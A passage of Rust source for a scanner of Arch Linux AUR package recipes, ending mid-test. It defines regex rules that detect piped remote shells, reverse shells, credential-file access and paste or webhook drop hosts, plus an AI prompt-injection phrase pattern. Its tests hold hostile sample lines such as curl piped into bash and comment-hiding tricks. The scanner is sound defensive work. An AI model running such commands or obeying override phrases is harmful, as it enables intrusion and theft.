use crate::model::{Evidence, Finding, Severity, Snapshot};
use regex::Regex;
use std::sync::LazyLock;

/// Which files of a checkout a rule looks at.
#[derive(Clone, Copy, PartialEq)]
enum Scope {
    /// Every text file.
    All,
    /// Every text file except `.SRCINFO`, which is generated from the
    /// PKGBUILD, is not read by makepkg and would only repeat its findings.
    Code,
    /// Shell that runs: the PKGBUILD, install scripts, `*.sh` and anything
    /// that starts with `#!`. Not patches, licence texts or images, where a
    /// URL or the word `eval` is content, not a command.
    Scripts,
    /// The PKGBUILD: what runs while the package is built.
    Recipe,
    /// Install scripts (`*.install`): what pacman runs as root when the
    /// package is installed, upgraded or removed.
    InstallScript,
}

struct Rule {
    id: &'static str,
    severity: Severity,
    message: &'static str,
    pattern: Regex,
    inspect_comments: bool,
    scope: Scope,
    /// The rule is about a command being run. A line that only prints text
    /// (`echo "now run: pacman -S foo"`) is not that command.
    skip_messages: bool,
    /// A match that also matches this is not reported.
    ignore: Option<Regex>,
    /// A line that matches this is not reported.
    ignore_line: Option<Regex>,
    /// Only a line that matches this is reported.
    require_line: Option<Regex>,
}

/// Where a command can start on a line: at its beginning, after a separator,
/// inside a command substitution, or after a keyword that takes a command.
/// Not after a bare `(`: `makedepends=(curl)` names a package.
const AT_COMMAND: &str =
    r"(?:^|[;&|{`]|\$\(|\b(?:then|do|else|elif|if|while|until|exec|sudo|doas|pkexec|run0)\s)\s*";

fn rule(id: &'static str, severity: Severity, message: &'static str, pattern: &str) -> Rule {
    Rule {
        id,
        severity,
        message,
        pattern: Regex::new(pattern).expect("built-in rule must compile"),
        inspect_comments: false,
        scope: Scope::Code,
        skip_messages: false,
        ignore: None,
        ignore_line: None,
        require_line: None,
    }
}

impl Rule {
    fn in_comments(mut self) -> Self {
        self.inspect_comments = true;
        self
    }
    fn scope(mut self, scope: Scope) -> Self {
        self.scope = scope;
        self
    }
    fn commands_only(mut self) -> Self {
        self.skip_messages = true;
        self
    }
    fn unless(mut self, pattern: &str) -> Self {
        self.ignore = Some(Regex::new(pattern).expect("built-in rule must compile"));
        self
    }
    fn only_line(mut self, pattern: &str) -> Self {
        self.require_line = Some(Regex::new(pattern).expect("built-in rule must compile"));
        self
    }
    fn unless_line(mut self, pattern: &str) -> Self {
        self.ignore_line = Some(Regex::new(pattern).expect("built-in rule must compile"));
        self
    }
}

// Severity is the whole policy. `Block`: behaviour with no honest use in a
// recipe. `Review`: a concrete security risk a person has to decide about.
// `Info`: worth a line in the report, and no reason to stop.
static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    use Scope::{All, InstallScript, Recipe, Scripts};
    use Severity::{Block, Info, Review};
    vec![
        rule("REMOTE-SHELL", Block, "Downloads are piped into a shell without a separately reviewed source.", r"\b(?:curl|wget)\b[^\n]*\|\s*(?:ba|z)?sh\b"),
        rule("ENCODED-SHELL", Block, "Decoded content is piped into a shell.", r"\b(?:base64|xxd)\b[^\n]*\|\s*(?:ba|z)?sh\b"),
        rule("KNOWN-PAYLOAD", Block, "A package name used in known AUR malware campaigns is installed.", r"\b(?:npm|bun|pnpm|yarn)\s+(?:install|add)\s+(?:atomic-lockfile|js-digest)\b"),
        rule("PRIVATE-KEY", Block, "The recipe refers to private authentication material. Review why it needs access.", r"(?:~|\$HOME|\$\{HOME\})/\.(?:ssh/id_[A-Za-z0-9_]+|aws/credentials|gnupg/private-keys-v1\.d)"),
        rule("REVERSE-SHELL", Block, "A shell is connected to a network socket.", r"\b(?:ba|z)?sh\s+-i\b[^\n]*/dev/(?:tcp|udp)/|\b(?:nc|ncat|netcat)\b[^\n]*\s(?:-[A-Za-z]*e\b|--(?:sh-)?exec\b)|\bsocat\b[^\n]*\b(?i:exec|system):"),
        rule("DYNAMIC-EVAL", Review, "Dynamic shell evaluation obscures the commands that execute.", r"\beval\s+").scope(Scripts),
        rule("PRIVILEGE", Review, "The recipe invokes a privilege-changing tool.", r"(?:^|[;&|]\s*|\s)(?:sudo|doas|pkexec|run0)\s+"),
        // Checksums written as array items are judged one by one in
        // `skipped_checksums`; this catches the other ways of writing them.
        rule("SKIPPED-CHECKSUM", Review, SKIPPED, r"(?i)\b(?:sha[0-9]+sums|b2sums|md5sums|cksums)(?:_[a-z0-9_]+)?(?:\[[^\]\n]*\])?\s*[+]?=[^\n]*\bSKIP\b"),
        // The homepage in `url=` is not fetched; an XML namespace is not a URL.
        rule("PLAIN-HTTP", Review, "Something is fetched over unencrypted HTTP.", r"\bhttp://[^\s\x22\x27)]+").scope(Scripts).unless(r"^http://www\.w3\.org/").unless_line(r"^\s*url="),
        rule("PROMPT-INJECTION", Review, "Text addresses an AI reviewer. Treat these instructions as untrusted package data.", r"(?i)(?:ignore (?:all |any )?(?:previous|prior) instructions|system prompt|you are (?:an? )?(?:ai|security auditor))").in_comments().scope(All),
        rule("RAW-SOCKET", Review, "A network connection is opened through the shell's /dev/tcp.", r"/dev/(?:tcp|udp)/"),
        rule("SETUID", Review, "A file is given the setuid or setgid bit, or a capability: it will run with more privilege than its user.", SETUID).unless_line(SANDBOX_HELPER),
        rule("SANDBOX-HELPER", Info, "Chromium's sandbox helper is made setuid root, as Chromium-based applications require.", SETUID).only_line(SANDBOX_HELPER),
        rule("PRIVILEGE-CONFIG", Review, "The recipe touches the configuration that decides who may become root (sudo, doas, PAM or polkit).", r"/etc/sudoers\b|/etc/doas\.conf\b|/etc/pam\.d/|/polkit-1/rules\.d\b"),
        rule("STARTUP-FILE", Review, "The recipe refers to a shell startup or autostart file of a user: code placed there runs at every login.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+|/root)/\.(?:bashrc|bash_profile|bash_login|profile|zshrc|zprofile|zshenv|xinitrc|xprofile|config/fish/config\.fish|config/autostart)\b|/etc/ld\.so\.preload\b").commands_only(),
        rule("CREDENTIAL-STORE", Review, "The recipe refers to where browsers, password managers or developer tools keep credentials.", r"(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]+)/\.(?:mozilla|config/(?:google-chrome|chromium|BraveSoftware|Bitwarden)|local/share/keyrings|password-store|netrc|git-credentials|kube/config|docker/config\.json|config/gh/hosts\.yml)\b|\bwallet\.dat\b").commands_only(),
        rule("DROP-HOST", Review, "The recipe refers to a paste, file-drop, webhook or tunnel service: places code is fetched from, or data is sent to, without a trace.", r"(?i)discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|\b(?:pastebin\.com|paste\.ee|transfer\.sh|0x0\.st|termbin\.com|ix\.io|file\.io|temp\.sh|bashupload\.com|oshi\.at)\b|\b[a-z0-9-]+\.ngrok(?:-free)?\.(?:io|app|dev)\b"),
        rule("NUMERIC-HOST", Review, "A URL points at a numeric address instead of a named host.", r"\bhttps?://(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").unless(r"://(?:127\.|0\.0\.0\.0)"),
        rule("PACKAGE-MANAGER", Review, "The recipe runs a package manager itself.", &format!(r"{AT_COMMAND}(?:pacman|yay|paru|pamac|pikaur)\s+(?:-[A-Za-z-]+\s+)*-[A-Za-z]*[SUR]")).commands_only(),
        rule("DISABLE-PROTECTION", Review, "A system protection is switched off.", r"\bsetenforce\s+0\b|\bufw\s+disable\b|\biptables\s+(?:-F|--flush)\b|\bnft\s+flush\s+ruleset\b|\bsystemctl\s+(?:--[a-z-]+\s+)*(?:stop|disable|mask)\s+[^\n]*\b(?:firewalld|ufw|apparmor|auditd|nftables|iptables)\b|\bkernel\.(?:randomize_va_space|kptr_restrict|yama\.ptrace_scope)\s*=\s*0\b").commands_only(),
        rule("DESTRUCTIVE", Review, "Files are deleted from the filesystem root or a home directory.", &format!(r"{AT_COMMAND}rm\s+(?:-[A-Za-z-]+\s+)+[\x22\x27]?(?:/|~|\$HOME|\$\{{HOME\}})/?\*?[\x22\x27]?(?:\s|;|&|$)")).commands_only(),
        rule("BUILD-DOWNLOAD", Review, "The build downloads something itself, outside the declared sources and their checksums.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c)\s")).scope(Recipe).commands_only(),
        rule("OUTSIDE-WRITE", Review, "The build writes to the system instead of into the package directory.", r"(?:>>?|\btee\s+(?:-a\s+)?)\s*[\x22\x27]?/(?:etc|usr|opt|var|bin|sbin|lib|lib64|boot|root|home)/").scope(Recipe).commands_only(),
        rule("INSTALL-DOWNLOAD", Review, "The install script, which runs as root, fetches or installs software itself.", &format!(r"{AT_COMMAND}(?:curl|wget|aria2c|git\s+clone|pip3?\s+install|npm\s+(?:i|install|ci)|pnpm\s+(?:i|install|add)|yarn\s+(?:install|add)|gem\s+install|cargo\s+install|go\s+install)\b")).scope(InstallScript).commands_only(),
        rule("INSTALL-SERVICE", Info, "The install script starts, stops or enables a service.", &format!(r"{AT_COMMAND}systemctl\s+(?:--[a-z-]+\s+)*(?:enable|start|restart|disable|stop|mask)\b")).scope(InstallScript).commands_only(),
        rule("PRELOAD", Info, "A library is preloaded into a program (LD_PRELOAD).", r"\bLD_PRELOAD="),
    ]
});

const SKIPPED: &str = "A source checksum is skipped. Check the reason and source provenance.";
const SETUID: &str = r"\bchmod\s+(?:-[A-Za-z]+\s+)*(?:[2467][0-7]{3}\b|[ugoa]*\+[rwxX]*s)|\binstall\b[^\n]*\s-[A-Za-z]*m\s*[2467][0-7]{3}\b|\bsetcap\s";
const SANDBOX_HELPER: &str = r"\bchrome[-_]sandbox\b";

/// Whether a line only prints text: its first word is a printing command and
/// nothing on the line can run something else or send the text anywhere.
fn prints_text(line: &str) -> bool {
    let first = line
        .trim_start()
        .split(|c: char| c.is_whitespace())
        .next()
        .unwrap_or("");
    matches!(
        first,
        "echo" | "printf" | "msg" | "msg2" | "warning" | "error" | "plain" | "note"
    ) && !line.contains(['|', '`', '>', '<', ';', '&'])
        && !line.contains("$(")
}

/// The items of the array assignments of a PKGBUILD: for each array name, its
/// items in order with the line each is on. Reads `name=(…)` and `name+=(…)`
/// at the start of a line, across lines, with plain quoting and `{a,b}`
/// alternatives. Anything it cannot read as a list of words ends that array;
/// what it returns was written literally.
fn arrays(text: &str) -> Vec<(String, Vec<(usize, String)>)> {
    let mut out: Vec<(String, Vec<(usize, String)>)> = Vec::new();
    let mut open: Option<usize> = None;
    for (index, line) in text.lines().enumerate() {
        let mut rest = line;
        if open.is_none() {
            let trimmed = line.trim_start();
            let name_len = trimmed
                .bytes()
                .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .count();
            let after = &trimmed[name_len..];
            let Some(body) = after
                .strip_prefix("=(")
                .or_else(|| after.strip_prefix("+=("))
            else {
                continue;
            };
            if name_len == 0 || trimmed.as_bytes()[0].is_ascii_digit() {
                continue;
            }
            let name = &trimmed[..name_len];
            let at = match out.iter().position(|(n, _)| n == name) {
                Some(at) if after.starts_with("+=") => at,
                Some(at) => {
                    out[at].1.clear();
                    at
                }
                None => {
                    out.push((name.to_string(), Vec::new()));
                    out.len() - 1
                }
            };
            open = Some(at);
            rest = body;
        }
        let Some(at) = open else { continue };
        let mut word = String::new();
        let mut in_word = false;
        let mut quote: Option<char> = None;
        let mut chars = rest.chars().peekable();
        let mut closed = false;
        while let Some(c) = chars.next() {
            match (quote, c) {
                (Some(q), c) if c == q => quote = None,
                (Some(_), c) => word.push(c),
                (None, '\'' | '"') => {
                    quote = Some(c);
                    in_word = true;
                }
                (None, '#') if !in_word => break,
                (None, ')') => {
                    closed = true;
                    break;
                }
                (None, c) if c.is_whitespace() => {
                    if in_word {
                        for item in alternatives(&word) {
                            out[at].1.push((index + 1, item));
                        }
                        word.clear();
                        in_word = false;
                    }
                }
                (None, c) => {
                    word.push(c);
                    in_word = true;
                }
            }
        }
        if in_word {
            for item in alternatives(&word) {
                out[at].1.push((index + 1, item));
            }
        }
        // A quote left open at the end of a line: not a plain list of words.
        if closed || quote.is_some() {
            open = None;
        }
    }
    out
}

/// `name{,.sig}` as the shell expands it: `name`, `name.sig`. One group.
fn alternatives(word: &str) -> Vec<String> {
    // The first `{…}` that is a list (it has a comma) and not a `${name}`.
    let group = word.match_indices('{').find_map(|(start, _)| {
        let end = start + word[start..].find('}')?;
        (!word[..start].ends_with('$') && word[start..end].contains(',')).then_some((start, end))
    });
    match group {
        Some((start, end)) => word[start + 1..end]
            .split(',')
            .map(|part| format!("{}{part}{}", &word[..start], &word[end + 1..]))
            .collect(),
        None => vec![word.to_string()],
    }
}

/// Checksums of the PKGBUILD that are `SKIP`, each judged by the source it
/// belongs to. A version-control source cannot have a checksum, and a
/// signature file is the check, not the thing checked: neither is a reason to
/// stop. A file verified by a PGP signature the recipe pins is noted. Any
/// other skipped checksum is a download nothing verifies.
fn skipped_checksums(text: &str) -> (Vec<Finding>, Vec<usize>) {
    let arrays = arrays(text);
    let items = |name: &str| {
        arrays
            .iter()
            .find(|(n, _)| n == name)
            .map(|(_, items)| items.as_slice())
    };
    let pinned_keys = items("validpgpkeys").is_some_and(|keys| !keys.is_empty());
    let is_signature = |source: &str| {
        [".sig", ".asc", ".sign"]
            .iter()
            .any(|ext| source.ends_with(ext))
    };
    let is_vcs = |source: &str| {
        let location = source
            .split_once("::")
            .map_or(source, |(_, location)| location);
        ["git+", "svn+", "hg+", "bzr+", "fossil+", "git://"]
            .iter()
            .any(|scheme| location.starts_with(scheme))
    };
    let mut findings = Vec::new();
    // Every line with a judged `SKIP`, whatever the judgement was.
    let mut lines = Vec::new();
    for (name, sums) in &arrays {
        let Some((algorithm, arch)) = name.split_once("sums") else {
            continue;
        };
        if !matches!(
            algorithm,
            "md5" | "sha1" | "sha224" | "sha256" | "sha384" | "sha512" | "b2" | "ck"
        ) {
            continue;
        }
        let sources = items(&format!("source{arch}")).unwrap_or(&[]);
        for (position, (line, sum)) in sums.iter().enumerate() {
            if sum != "SKIP" {
                continue;
            }
            lines.push(*line);
            let source = sources.get(position).map(|(_, source)| source.as_str());
            let (severity, message) = match source {
                Some(source) if is_signature(source) => continue,
                Some(source) if is_vcs(source) => (
                    Severity::Info,
                    "A version-control source has no checksum: what is built is whatever the repository holds at the named revision.",
                ),
                Some(source)
                    if pinned_keys
                        && sources
                            .iter()
                            .any(|(_, other)| is_signature(other) && other.starts_with(source)) =>
                {
                    (
                        Severity::Info,
                        "A checksum is skipped for a source that is verified by a pinned PGP signature instead.",
                    )
                }
                _ => (Severity::Review, SKIPPED),
            };
            findings.push(Finding {
                rule_id: "SKIPPED-CHECKSUM".into(),
                source: "deterministic".into(),
                severity,
                message: message.into(),
                evidence: vec![Evidence {
                    path: "PKGBUILD".into(),
                    line: *line,
                    quote: "SKIP".into(),
                }],
            });
        }
    }
    (findings, lines)
}

/// For each line of `text`, whether it is certainly a shell comment.
///
/// A line that begins with `#` is a comment only when the shell reads it in
/// command context. Inside a string that spans lines, inside a here-document,
/// or after a backslash that joins it to the previous line, the same text is
/// data or code: `x="` followed by `#"; curl … | sh` runs the download. So
/// this follows the shell's quoting far enough to know where each line
/// starts, and it never guesses: at the first construct it does not model
/// exactly (anything other than plain quoting, simple `${…}`, one-line
/// `$(…)` inside double quotes, flat arithmetic and ordinary here-documents)
/// it stops trusting comments for the rest of the file. From there on,
/// comment-looking lines are inspected like any other line. The cost of not
/// knowing is a finding in a comment, never a skipped command.
fn comment_lines(text: &str) -> Vec<bool> {
    #[derive(Clone, Copy, PartialEq)]
    enum State {
        Command,
        Single,
        Double,
        /// `$'…'`, where a backslash escapes the quote.
        Ansi,
    }
    let is_blank = |c: char| c == ' ' || c == '\t';
    let mut flags = Vec::new();
    let mut state = State::Command;
    let mut trusted = true;
    let mut joined = false;
    let mut in_backticks = false;
    // The here-document being read: its end marker, and whether leading tabs are ignored.
    let mut heredoc: Option<(Vec<char>, bool)> = None;
    for raw in text.split('\n') {
        let line: Vec<char> = raw.chars().collect();
        if let Some((marker, strip_tabs)) = &heredoc {
            flags.push(false);
            let body = if *strip_tabs {
                let tabs = line.iter().take_while(|c| **c == '\t').count();
                &line[tabs..]
            } else {
                &line[..]
            };
            if body == marker.as_slice() {
                heredoc = None;
            }
            continue;
        }
        let first = line.iter().position(|c| !is_blank(*c));
        let hash_first = first.is_some_and(|k| line[k] == '#');
        if hash_first && state == State::Command && joined {
            // `foo\` then `#bar`: one word, `foo#bar`, and no comment at all.
            trusted = false;
        }
        flags.push(trusted && hash_first && state == State::Command && !joined);
        joined = false;
        let mut pending: Option<(Vec<char>, bool)> = None;
        let mut k = 0;
        while k < line.len() {
            let c = line[k];
            let next = line.get(k + 1).copied();
            match state {
                State::Single => {
                    if c == '\'' {
                        state = State::Command;
                    }
                    k += 1;
                }
                State::Ansi => {
                    if c == '\\' {
                        k += 2;
                    } else {
                        if c == '\'' {
                            state = State::Command;
                        }
                        k += 1;
                    }
                }
                State::Double => match c {
                    '\\' => k += 2,
                    '"' => {
                        state = State::Command;
                        k += 1;
                    }
                    '`' => {
                        trusted = false;
                        k += 1;
                    }
                    '$' if next == Some('(') => match simple_substitution(&line, k) {
                        Some(end) => k = end,
                        None => {
                            trusted = false;
                            k += 2;
                        }
                    },
                    '$' if next == Some('{') => match simple_parameter(&line, k + 2) {
                        Some(end) => k = end,
                        None => {
                            trusted = false;
                            k += 2;
                        }
                    },
                    _ => k += 1,
                },
                State::Command => match c {
                    '\\' => {
                        if in_backticks {
                            // Backslashes mean something else inside backticks.
                            trusted = false;
                        }
                        if k + 1 >= line.len() {
                            joined = true;
                        }
                        k += 2;
                    }
                    '\'' => {
                        state = State::Single;
                        k += 1;
                    }
                    '"' => {
                        state = State::Double;
                        k += 1;
                    }
                    '`' => {
                        in_backticks = !in_backticks;
                        k += 1;
                    }
                    '$' if next == Some('\'') => {
                        state = State::Ansi;
                        k += 2;
                    }
                    '$' if next == Some('#') => k += 2,
                    '$' if next == Some('{') => match simple_parameter(&line, k + 2) {
                        Some(end) => k = end,
                        None => {
                            trusted = false;
                            k += 2;
                        }
                    },
                    '(' if next == Some('(') => match flat_arithmetic(&line, k + 2) {
                        Some(end) => k = end,
                        None => {
                            trusted = false;
                            k += 2;
                        }
                    },
                    '#' => match k.checked_sub(1).map(|p| line[p]) {
                        // A word that starts with `#`: the rest of the line is a comment.
                        None => break,
                        Some(p) if is_blank(p) => break,
                        // In the middle of a word it is an ordinary character.
                        Some(p) if p.is_ascii_alphanumeric() || "_-./=+:@%,~".contains(p) => k += 1,
                        _ => {
                            trusted = false;
                            k += 1;
                        }
                    },
                    '<' if next == Some('<') => {
                        if line.get(k + 2) == Some(&'<') {
                            k += 3;
                        } else {
                            match heredoc_marker(&line, k + 2) {
                                Some((marker, strip_tabs, end)) if pending.is_none() => {
                                    pending = Some((marker, strip_tabs));
                                    k = end;
                                }
                                _ => {
                                    trusted = false;
                                    k += 2;
                                }
                            }
                        }
                    }
                    _ => k += 1,
                },
            }
        }
        if let Some(found) = pending {
            if state == State::Command && !joined {
                heredoc = Some(found);
            } else {
                trusted = false;
            }
        }
    }
    flags
}

/// `${…}` starting after the brace at `i`: where it ends, if it is plain
/// (no quoting, no substitution, no line break inside).
fn simple_parameter(line: &[char], mut i: usize) -> Option<usize> {
    loop {
        match *line.get(i)? {
            '}' => return Some(i + 1),
            '\'' | '"' | '`' => return None,
            // `${pkgver/\.r*/}`: an escaped ordinary character changes nothing
            // here. An escaped quote is refused: whether it quotes depends on
            // the context and the shell version.
            '\\' => match line.get(i + 1) {
                None | Some('\'') | Some('"') | Some('`') => return None,
                Some(_) => i += 2,
            },
            '$' if line.get(i + 1) == Some(&'{') => i = simple_parameter(line, i + 2)?,
            '$' if line.get(i + 1) == Some(&'(') => return None,
            _ => i += 1,
        }
    }
}

/// `$(…)` starting at `i`, inside double quotes: where it ends, if it is a
/// plain command on one line. Where a `)` ends a substitution depends on the
/// shell grammar (`case` patterns, `[[ … ]]`, arithmetic, comments), so
/// anything that could involve it is refused.
fn simple_substitution(line: &[char], i: usize) -> Option<usize> {
    let mut k = i + 2;
    let start = k;
    loop {
        match *line.get(k)? {
            ')' => {
                let body: String = line[start..k].iter().collect();
                return if body.contains("case") {
                    None
                } else {
                    Some(k + 1)
                };
            }
            '(' | '`' | '#' | '\\' | '<' | '[' | '{' => return None,
            '\'' => {
                k += 1;
                while *line.get(k)? != '\'' {
                    k += 1;
                }
                k += 1;
            }
            '"' => {
                k += 1;
                loop {
                    match *line.get(k)? {
                        '"' => break,
                        '\\' | '`' => return None,
                        '$' if line.get(k + 1) == Some(&'(') => k = simple_substitution(line, k)?,
                        '$' if line.get(k + 1) == Some(&'{') => k = simple_parameter(line, k + 2)?,
                        _ => k += 1,
                    }
                }
                k += 1;
            }
            '$' if line.get(k + 1) == Some(&'(') => k = simple_substitution(line, k)?,
            '$' if line.get(k + 1) == Some(&'{') => k = simple_parameter(line, k + 2)?,
            '$' if line.get(k + 1) == Some(&'\'') => return None,
            _ => k += 1,
        }
    }
}

/// `((…))` starting after the parentheses at `i`: where it ends, if the
/// expression is flat. Quote characters do not quote inside arithmetic, so
/// an expression that contains any is refused.
fn flat_arithmetic(line: &[char], mut i: usize) -> Option<usize> {
    loop {
        match *line.get(i)? {
            ')' if line.get(i + 1) == Some(&')') => return Some(i + 2),
            '(' | ')' | '\'' | '"' | '`' | '\\' | '#' => return None,
            _ => i += 1,
        }
    }
}

/// The end marker of a here-document whose `<<` ends before `i`: the marker,
/// whether leading tabs are stripped, and where the marker ends.
fn heredoc_marker(line: &[char], mut i: usize) -> Option<(Vec<char>, bool, usize)> {
    let strip_tabs = line.get(i) == Some(&'-');
    if strip_tabs {
        i += 1;
    }
    while matches!(line.get(i), Some(' ') | Some('\t')) {
        i += 1;
    }
    let quote = match line.get(i) {
        Some(q @ ('\'' | '"')) => {
            i += 1;
            Some(*q)
        }
        Some('\\') => {
            i += 1;
            None
        }
        _ => None,
    };
    let start = i;
    while line
        .get(i)
        .is_some_and(|c| c.is_ascii_alphanumeric() || *c == '_')
    {
        i += 1;
    }
    if i == start || line[start].is_ascii_digit() {
        return None;
    }
    let marker = line[start..i].to_vec();
    if let Some(q) = quote {
        if line.get(i) != Some(&q) {
            return None;
        }
        i += 1;
    }
    match line.get(i) {
        None | Some(' ') | Some('\t') | Some(';') | Some('|') | Some('&') | Some(')')
        | Some('>') => Some((marker, strip_tabs, i)),
        _ => None,
    }
}

pub(crate) fn inspect(snapshot: &Snapshot) -> Vec<Finding> {
    let mut findings = Vec::new();
    for file in &snapshot.files {
        let comments = comment_lines(&file.text);
        let is_recipe = file.path == "PKGBUILD";
        let is_install_script = file.path.ends_with(".install");
        let is_script = is_recipe
            || is_install_script
            || file.path.ends_with(".sh")
            || file.path.ends_with(".bash")
            || file.text.starts_with("#!");
        // Checksums written as array items are judged by their source.
        let (judged, judged_lines) = if is_recipe {
            skipped_checksums(&file.text)
        } else {
            Default::default()
        };
        findings.extend(judged);
        for (index, line) in file.text.lines().enumerate() {
            let is_comment = comments.get(index).copied().unwrap_or(false);
            let is_message = prints_text(line);
            let line_start = findings.len();
            for rule in RULES.iter() {
                if !rule.inspect_comments && is_comment {
                    continue;
                }
                let in_scope = match rule.scope {
                    Scope::All => true,
                    Scope::Code => file.path != ".SRCINFO",
                    Scope::Scripts => is_script,
                    Scope::Recipe => is_recipe,
                    Scope::InstallScript => is_install_script,
                };
                if !in_scope
                    || (rule.skip_messages && is_message)
                    || rule
                        .ignore_line
                        .as_ref()
                        .is_some_and(|skip| skip.is_match(line))
                    || rule
                        .require_line
                        .as_ref()
                        .is_some_and(|need| !need.is_match(line))
                    || (rule.id == "SKIPPED-CHECKSUM"
                        && (!is_recipe || judged_lines.contains(&(index + 1))))
                {
                    continue;
                }
                // The first match that is not an exception: a namespace URL
                // before a real one on the same line does not hide it.
                let found = rule.pattern.find_iter(line).find(|m| {
                    !rule
                        .ignore
                        .as_ref()
                        .is_some_and(|skip| skip.is_match(m.as_str()))
                });
                if let Some(matched) = found {
                    findings.push(Finding {
                        rule_id: rule.id.into(),
                        source: "deterministic".into(),
                        severity: rule.severity,
                        message: rule.message.into(),
                        evidence: vec![Evidence {
                            path: file.path.clone(),
                            line: index + 1,
                            quote: matched.as_str().chars().take(512).collect(),
                        }],
                    });
                }
                if findings.len() >= 256 {
                    findings.push(Finding {
                        rule_id: "FINDING-LIMIT".into(),
                        source: "engine".into(),
                        severity: Severity::Block,
                        message:
                            "The finding limit was reached. Additional findings are not listed."
                                .into(),
                        evidence: vec![],
                    });
                    return findings;
                }
            }
            // A line that is blocked is reported for that: the lesser things
            // the same command also is (a download, say) add nothing to it.
            if findings[line_start..]
                .iter()
                .any(|f| f.severity == Severity::Block)
            {
                let mut kept = line_start;
                for at in line_start..findings.len() {
                    if findings[at].severity == Severity::Block {
                        findings.swap(kept, at);
                        kept += 1;
                    }
                }
                findings.truncate(kept);
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::PackageFile;

    fn snapshot(text: &str) -> Snapshot {
        Snapshot {
            files: vec![PackageFile {
                path: "PKGBUILD".into(),
                mode: 0o644,
                text: text.into(),
                sha256: String::new(),
            }],
            directories: vec![],
            digest: String::new(),
            excluded: vec![],
            identities: vec![],
            ancestry: vec![],
        }
    }

    #[test]
    fn reports_exact_source_evidence() {
        let findings = inspect(&snapshot(
            "pkgname=demo\nbuild() { curl https://example.invalid/payload | bash; }\n",
        ));
        assert_eq!(findings[0].rule_id, "REMOTE-SHELL");
        assert_eq!(findings[0].severity, Severity::Block);
        assert_eq!(findings[0].evidence[0].line, 2);
        assert_eq!(
            findings[0].evidence[0].quote,
            "curl https://example.invalid/payload | bash"
        );
    }

    #[test]
    fn comments_are_not_shell_commands_but_ai_instructions_are_reported() {
        let findings = inspect(&snapshot(
            "# curl https://example.invalid | bash\n# ignore previous instructions\n",
        ));
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "PROMPT-INJECTION");
    }

    fn rule_ids(text: &str) -> Vec<String> {
        inspect(&snapshot(text))
            .into_iter()
            .map(|f| f.rule_id)
            .collect()
    }

    #[test]
    fn a_hash_inside_a_string_that_spans_lines_is_not_a_comment() {
        // The second line closes the string and runs the download.
        assert_eq!(
            rule_ids("x=\"\n#\"; curl https://example.invalid/p | sh\n"),
            ["REMOTE-SHELL"]
        );
        assert_eq!(
            rule_ids("x='\n#'; curl https://example.invalid/p | sh\n"),
            ["REMOTE-SHELL"]
        );
        assert_eq!(
            rule_ids("x=$'it\\'s\n#'; curl https://example.invalid/p | sh\n"),
            ["REMOTE-SHELL"]
        );
    }

    #[test]
    fn a_hash_joined_to_the_previous_line_is_not_a_comment() {
        assert_eq!(
            rule_ids("echo foo\\\n#bar; curl https://example.invalid/p | sh\n"),
            ["REMOTE-SHELL"]
        );
    }

    #[test]
    fn only_spaces_and_tabs_may_precede_a_comment() {
        // The shell does not treat these as blanks: the line is a command.
        for lead in ["\u{a0}", "\u{2003}", "\u{c}", "\r"] {
            let text = format!("{lead}#; curl https://example.invalid/p | sh\n");
            assert_eq!(rule_ids(&text), ["REMOTE-SHELL"], "{lead:?}");
        }
        assert!(rule_ids(" \t # curl https://example.invalid/p | sh\n").is_empty());
    }

    #[test]
    fn here_document_bodies_are_inspected() {
        // An unquoted here-document expands `$(…)` in its body.
        assert_eq!(
            rule_ids(
                "cat <<EOF\n# $(curl https://example.invalid/p | sh)\nEOF\n# curl https://a.invalid | sh\n"
            ),
            ["REMOTE-SHELL"]
        );
        // A marker this does not model keeps every later line under inspection.
        assert_eq!(
            rule_ids("cat <<\"E OF\"\nE OF\n# curl https://a.invalid | sh\n"),
            ["REMOTE-SHELL"]
        );
    }

    #[test]
    fn constructs_that_are_not_modelled_end_the_trust_in_comments() {
        // A `)` in a case pattern does not end the substitution, so the quote
        // after it opens a string and the next line is not a comment.
        let text =
            "x=\"$(case a in a) echo \"\n#\"; curl https://example.invalid/p | sh;; esac)\"\n";
        assert_eq!(rule_ids(text), ["REMOTE-SHELL"]);
        // Quote characters do not quote inside arithmetic.
        let text = ": $(( ' ))\nx='\n#'; curl https://example.invalid/p | sh\n";
        assert_eq!(rule_ids(text), ["REMOTE-SHELL"]);
        // An escaped quote inside `${…}` is refused too.
        let text = "y=${x/\\'/}\nx='\n#'; curl https://example.invalid/p | sh\n";
        assert_eq!(rule_ids(text), ["REMOTE-SHELL"]);
        // A hash after an operator is refused rather than guessed.
        let text = "true;#'\nx='\n#'; curl https://example.invalid/p | sh\n";
        assert_eq!(rule_ids(text), ["REMOTE-SHELL"]);
    }

    #[test]
    fn ordinary_recipes_keep_their_comments() {
        let text = concat!(
            "# Maintainer: someone, see http://example.invalid/about\n",
            "pkgname=demo-git\n",
            "source=(\"$pkgname::git+https://example.invalid/demo.git\"\n",
            "        # sudo make install was here once\n",
            "        'local.patch') # don't reorder\n",
            "pkgver() {\n",
            "  cd \"${srcdir}/${pkgname%-git}\" # ${pkgver/\\.r*/} and \"${pkgver//\\./_}\"\n",
            "  : \"${pkgver/\\.r*/}\" ${pkgver//\\./_}\n",
            "  printf \"r%s.%s\" \"$(git rev-list --count HEAD)\" \"$(git rev-parse --short HEAD)\"\n",
            "  # eval is not used here\n",
            "}\n",
            "package() {\n",
            "  local n=${#pkgname} m=$(( n + 1 ))\n",
            "  install -Dm644 \"$(dirname \"$srcdir\")/x\" \"$pkgdir/usr/share/x\" # curl https://a.invalid | sh\n",
            "  cat > \"$pkgdir/usr/share/note\" <<'EOF'\n",
            "plain text\n",
            "EOF\n",
            "  # curl https://a.invalid | sh\n",
            "}\n",
        );
        // The one finding is the trailing comment on a code line, which was
        // never skipped; every whole-line comment is.
        assert_eq!(rule_ids(text), ["REMOTE-SHELL"]);
        let flags = comment_lines(text);
        let comments: Vec<usize> = flags
            .iter()
            .enumerate()
            .filter(|(_, c)| **c)
            .map(|(i, _)| i + 1)
            .collect();
        assert_eq!(comments, [1, 4, 10, 18]);
